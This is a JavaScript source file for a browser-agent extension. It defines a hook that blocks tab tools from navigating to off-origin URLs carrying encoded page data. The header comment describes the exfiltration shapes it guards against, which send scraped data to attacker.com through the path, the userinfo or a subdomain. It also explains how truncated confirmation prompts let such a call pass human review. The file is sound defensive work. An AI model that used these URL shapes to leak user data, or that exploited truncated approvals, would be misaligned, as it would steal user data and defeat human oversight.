// @ts-check
// The DOM-data→URL exfiltration tripwire, implemented AS a default
// pre-tool-use hook (#243). Sibling of egress-allowlist.js, and deliberately
// so: it covers exactly the hole that hook's own exemption leaves open.
//
// THE HOLE. egress-allowlist skips every primitive:'tab' tool
// (egress-allowlist.js — "browser-session tool (denylist-governed), skipped"),
// because reaching the user's logged-in apps IS peerd's thesis and gating them
// on the PROVIDER allowlist wrongly blocked opening Gmail. But a tab tool can
// still move bytes OFF the machine: `navigate` to `attacker.com/<scraped>` (or
// `https://<scraped>@attacker.com/`, or `<scraped>.attacker.com`) sends the
// payload to an attacker with a plain GET. The denylist can't see it — the
// destination is a host nobody put on a list — and the confirmation summary
// truncates a long arg, so a human "yes" is not real review either.
//
// WHY A HOOK AND NOT A GATE. Three reasons, in order of weight:
//   1. ORDERING. Gates run BEFORE the async confirmation; pre-tool-use hooks
//      run AFTER it (tools/dispatcher.js). The dispatcher calls the pre-hook
//      "the LAST programmable veto … so a human 'yes' can still be overruled
//      by a deterministic policy hook" — and that is precisely the situation
//      here, because summarizeCall() truncates string args to 40 chars, so the
//      user approving `navigate` never SAW the blob they approved.
//   2. THE GATE CHAIN ALREADY SAYS SO. The `egress` gate is a documented
//      chain no-op whose "teeth live in the hook layer" (tools/gates.js). This
//      is those teeth. Adding a 7th gate would also mutate the frozen GATES
//      order the lineage UI renders.
//   3. SYMMETRY. The exemption that opens the hole is a hook; the patch for it
//      belongs beside it, visible in the same Context → Hooks list.
//
// ALL the judgement lives in tools/egress-heuristics.js — a pure, never-throwing
// inspector with its threat model, its three scanned URL slots, and its KNOWN
// RESIDUALS written down. This file is the WIRING: pick the tab tools out of the
// stream, hand the inspector the call plus the origin of the tab it would act
// on, pass its verdict through. Keeping the policy pure is what lets it be
// tested exhaustively without a dispatcher.
//
// A TRIPWIRE, NOT A FLOOR. It errs hard toward allow and is layered UNDER the
// real containment (#241's schema boundary, #242's UGC downscale, the offscreen
// heap fence). Read egress-heuristics.js before trusting it with anything.

import { inspectTabToolCall } from '../../egress-heuristics.js';

/** @typedef {import('/shared/tool-types.js').Tool} Tool */

/**
 * The SW-injected extra this hook reads off the live tool context — same
 * erased-cast pattern as egress-allowlist.js, so the read stays honest without
 * widening the shared ToolContext contract.
 *
 * @typedef {Object} TripwireHookCtx
 * @property {(name: string) => Tool | undefined} [getToolMeta]
 */

/** @type {import('../runner.js').Hook} */
export const egressTripwireHook = {
  id: 'egress-tripwire',
  event: 'pre-tool-use',
  // why: rendered verbatim in the Context → Hooks tab. Says what it catches AND
  // what it does not, so a user reading the list does not mistake a best-effort
  // tripwire for a guarantee.
  description: 'Blocks a browser-session tool from navigating or typing an '
    + 'off-origin URL that carries a high-entropy encoded payload in its '
    + 'userinfo, host, or path — the DOM-data exfiltration shape. Best-effort '
    + 'tripwire, not a guarantee. Built-in code, registered at boot; cannot be '
    + 'disabled or removed.',
  // why: just after egress-allowlist (10) — both are network vetoes and belong
  // ahead of softer policy/observability hooks, and running second keeps the
  // allowlist (the hard floor) as the first thing a blocked call reports.
  order: 20,
  match: '*',
  run: (inv) => {
    const { args, toolName } = inv;
    const ctx = /** @type {import('/shared/tool-types.js').ToolContext & TripwireHookCtx} */ (inv.ctx);
    const tool = ctx.getToolMeta?.(toolName);
    // why: scope is EXACTLY the set egress-allowlist exempts. Everything else
    // already goes through the allowlist + safeFetch, so inspecting it here
    // would add false-block risk for no coverage.
    if (tool?.primitive !== 'tab') {
      return { action: 'allow', reason: 'egress-tripwire: not a browser-session tool, skipped' };
    }
    const verdict = inspectTabToolCall({
      name: toolName,
      args,
      // The origin of the tab this call acts on — what makes the destination
      // "off-origin", and the evidence a page was actually read. Absent (no
      // page loaded yet) means nothing has been scraped, and the inspector
      // allows.
      currentOrigin: ctx.activeTab?.origin ?? null,
    });
    return verdict.action === 'block'
      ? verdict
      : { action: 'allow', reason: 'egress-tripwire: no exfiltration shape detected' };
  },
};
